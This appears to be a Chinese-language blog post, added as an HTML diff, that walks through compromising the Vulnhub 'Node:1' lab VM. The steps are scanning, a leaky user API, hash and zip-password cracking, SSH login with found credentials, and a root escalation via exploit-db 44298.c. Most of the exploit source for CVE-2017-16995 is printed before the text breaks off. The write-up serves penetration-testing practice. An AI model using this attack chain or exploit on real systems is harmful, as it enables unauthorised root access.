@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="王六六">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="王六六">
+    <meta name="keywords" content="王六六的博客 | 王六六">
+    <meta name="description" content="It's raining cats and dogs.">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Vulnhub渗透笔记之Node:1 · wang66&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Still Shines.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Vulnhub渗透笔记之Node:1</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Still Shines.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Vulnhub渗透笔记之Node:1
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="vulnhub">vulnhub</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">3k</span> / Reading time: <span class="post-count">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/09/30</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>在漫长的拖延和犹豫之后，终于打算向vulnhub“下手”了，很早就打算把vulnhub上的题刷一遍。Vulnhub确实是一个非常不错的网站，上面的靶机都是非常值得探索的。然后对于渗透测试来讲，个人感觉动手实践才是快速提高的最有效的方法，之前的阶段一直停留在理论学习，所以今后还是要多动手操作呀。接下来开始进入正题：本次记录的是对vulnhub上的node1虚拟机的渗透过程。<a id="more"></a></p>
+<p><img src="/images/node1/1.jpg" alt></p>
+<h2 id="Node-1"><a href="#Node-1" class="headerlink" title="Node:1"></a>Node:1</h2><p>作者给的题目描述很简单：Node是一个中级boot2root挑战，最初是为HackTheBox创建的。可以找到两个flag（user和root flags）以及要使用的多种不同技术。OVA已经在VMware和Virtual Box上进行了测试。<br><img src="/images/node1/2.png" alt><br>看来我们最后是要拿到root权限，除此之外题目并没有提供其他对于解题的提示，因此猜测这题不会很难。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>两个虚拟机net模式连接。此时知道攻击机kali的ip地址为192.168.1.136。靶机开机后，不知道ip地址，也不知道用户名密码，这些都需要之后的信息收集，暂时能从虚拟机设置上看到靶机的物理地址。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先是要知道靶机的ip地址，现在已经把他们连在同一个网段中了，所以可以使用nmap扫描网段，或者使用netdiscover快速发现当前网段的主机。<br>使用nmap：</p>
+<blockquote>
+<p>nmap  -sP  192.168.1.0/24</p>
+</blockquote>
+<p><img src="/images/node1/3.png" alt></p>
+<p>使用netdiscover：</p>
+<blockquote>
+<p>netdiscover  -r  192.168.1.0/24</p>
+</blockquote>
+<p><img src="/images/node1/4.png" alt></p>
+<p>这里发现了许多的ip，但到底哪个是我们要找的呢。这里就要看之前了解的靶机的物理地址。可以知道靶机的ip地址是192.168.1.154。</p>
+<p>之后，我们再用nmap进行端口和服务的扫描，看看靶机上开启了哪些服务。</p>
+<blockquote>
+<p>nmap  -sV  192.168.1.154</p>
+</blockquote>
+<p><img src="/images/node1/5.png" alt></p>
+<p>从扫描结果来看我们看到靶机开放了22端口和3000端口。22端口提供ssh服务，3000端口则提供了web服务。</p>
+<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>在收集到靶机的一些基本信息之后，我们打算先从web服务入手。我们先用浏览器访问这个http端口：<br><img src="/images/node1/6.png" alt></p>
+<p>打开是一个网页，主页上简单的介绍了网站的信息，然后是目前三个用户，猜测这三个用户其中一个可能是后台的管理账户。接下来我们可以试着找一下网站的其他路径。我们这里使用burpsuite的爬虫功能模块。</p>
+<p>首先设置好浏览器的代理，并打开burpsuite，在Target模块处可以看到一些网站的其他路径。这些也都是经过burpsuite抓到的包。<br><img src="/images/node1/7.png" alt></p>
+<p>我们可以在这些路径中，发现一些有用的网页，比如配置信息，安装信息等。这里有一个路径引起了我的兴趣，就是/api/users/latest。因为有users存在，看看是否能得到一些用户信息。我们在浏览器中输入这个路径：<br><img src="/images/node1/8.png" alt></p>
+<p>果然发现了用户名，甚至还包括了密码，是职业上显示的三个用户，但遗憾的是，他们都不是管理员账户，普通用户对于我们来说没有任何用处。我们接着使用burpsuite的爬虫看看有没有隐藏路径。<br><img src="/images/node1/9.png" alt><br>之后再看扫描的结果：<br><img src="/images/node1/10.png" alt><br>比之前多出了一个/api/users。我们访问这个路径：<br><img src="/images/node1/11.png" alt><br>发现多出了一个账户，而这个账户正是管理员账户。<br>账户名：myP14ceAdm1nAcc0uNT<br>密码：dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af<br>密码显示是由MD5加密之后的字符串，我们需要把他破解。这里访问专门的MD5破解网站破解：<a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a><br><img src="/images/node1/12.png" alt><br>运气不错，破解出来了。明文密码是manchester。之后我们使用这个用户名密码进行登录<br>。此时我们拿到了网站的后台管理权限，也就是webshell 。<br><img src="/images/node1/13.png" alt></p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>登录之后， 发现有一个备份包（Download Backup），先把他下载到本地，看看里面提供了什么有价值的信息。</p>
+<p>下载下来的是一个叫myplace.black的文件，这里使用cat查看内容，发现里面是一大篇没有规则的字符串：<br><img src="/images/node1/14.png" alt><br>拉到最后看到有个“=”号，所以看形式应该是经过base64加密的。我们这里使用base64的解密工具：</p>
+<blockquote>
+<p>base64 -d myplace.backup &gt; myplace.zip</p>
+</blockquote>
+<p>这里用base64解密之后，让他生成一个压缩包。<br><img src="/images/node1/15.png" alt><br>之后在本地我们就看到一个压缩包已经生成：<br><img src="/images/node1/16.png" alt><br>现在我们查看压缩包里面的内容：<br><img src="/images/node1/17.png" alt><br>可以看出这是整个网站的备份，但是当我们尝试解压的时候，就会提示要输入解压密码。<br><img src="/images/node1/18.png" alt><br>但现在还不知道解压密码是什么，我们可以尝试进行爆破。这里使用字典爆破，要先把密码字典准备好，然后使用zip压缩包密码爆破工具：<strong>fcrackzip</strong></p>
+<blockquote>
+<p>fcrackzip -D -p pass.txt -u myplace.zip</p>
+</blockquote>
+<p><img src="/images/node1/19.png" alt></p>
+<p>成功破解出密码：<strong>magicword</strong></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在我们知道密码之后，就能打开压缩包查看里面的内容。但我们想要得到的是哪些内容呢。首先我们已经拿到了网站的管理员用户密码，之后我们想要获取到整个主机的权限，就需要提权。我们知道靶机还开放了ssh端口，这里可能就是我们的突破口，连接ssh的信息应该也放在了网站的配置文件中，而这就是我们想得到的东西。所以接下来就看看我们能否幸运地找到它吧。</p>
+<p>上面查看过压缩包里面的内容，处理html静态页面之外，还有一个js的脚本文件：app.js我们打开它发现如下内容：<br><img src="/images/node1/20.png" alt><br>在其中，可以看到一个类似于ssh连接形式的配置。就是框起来的内容。mark不正是一个用户名吗，那之后的肯定就是密码了。我们尝试使用mark的用户名ssh方式连接靶机：<br><img src="/images/node1/21.png" alt><br>输入用户名：mark 和密码：5AYRft73VtFpc84k之后，成功登陆到靶机。<br>但此时的我们并没有root权限，还只是一个普通的用户：<br><img src="/images/node1/22.png" alt><br>接下来我们开始正式的提权，提权的思路有很多，这里我们已经使用ssh登陆上了靶机，并且发现了存在一个/tmp/文件夹具有rwt（读写和执行）的权限。<br><img src="/images/node1/23.png" alt></p>
+<p>那我们就可以根据当前linux的版本，上传一个提权的exploit，这就是我们接着进行下去的思路。<br>先查看linux版本：<br><img src="/images/node1/24.png" alt><br>可以得知是linux 4.4.0<br>之后我们在kali上查找有没有相应的exploit。<br><img src="/images/node1/25.png" alt><br>符合我们查询条件的有这些，那到底用哪个呢？这里我们看到有一个本地提权的exploit，十分符合我们的需要，我们只要把它上传到靶机，然后进行提权就可以了。使用scp工具使exploit上传到/tmp文件夹：</p>
+<blockquote>
+<p>scp   /usr/share/exploitdb/exploits/linux/local/44298.c  <a href="mailto:mark@192.168.1.154" target="_blank" rel="noopener">mark@192.168.1.154</a>:/tmp</p>
+</blockquote>
+<p><img src="/images/node1/26.png" alt><br>然后在我们ssh连接到靶机的终端上编译上传上来的程序：<br><img src="/images/node1/27.png" alt><br>然后再执行：<br><img src="/images/node1/28.png" alt><br>运行成功，此时的我们的用户名也变成了root。并相应的拥有了root权限：<br><img src="/images/node1/29.png" alt><br>在root文件夹下，有一个文本文件，打开它，就是我们最终要拿到的flag：<br><img src="/images/node1/30.png" alt></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>在本次渗透中，我们所使用的工具有：</p>
+<blockquote>
+<p>•Nmap<br>•Netdiscover<br>•Burpsuite<br>•Base64<br>•Fcrackzip<br>•Searchsploit<br>•Scp</p>
+</blockquote>
+<p>以上工具都已经在kali linux上安装好了。</p>
+<h2 id="exploit详情"><a href="#exploit详情" class="headerlink" title="exploit详情"></a>exploit详情</h2><p><strong>漏洞编号：</strong>CVE-2017-16995</p>
+<p><strong>漏洞详情：</strong><br>该漏洞由Google project zero发现。该漏洞存在于带有 eBPF bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的Linux内核中，是一个内存任意读写漏洞。该漏洞是由eBPF验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。</p>
+<p><strong>漏洞源码：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> *__prog =  <span class="string">"\xb4\x09\x00\x00\xff\xff\xff\xff"</span></span><br><span class="line">        <span class="string">"\x55\x09\x02\x00\xff\xff\xff\xff"</span></span><br><span class="line">        <span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x18\x19\x00\x00\x03\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">        <span class="string">"\x62\x0a\xfc\xff\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x79\x06\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">        <span class="string">"\x62\x0a\xfc\xff\x01\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span class="string">"\x79\x07\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        <span 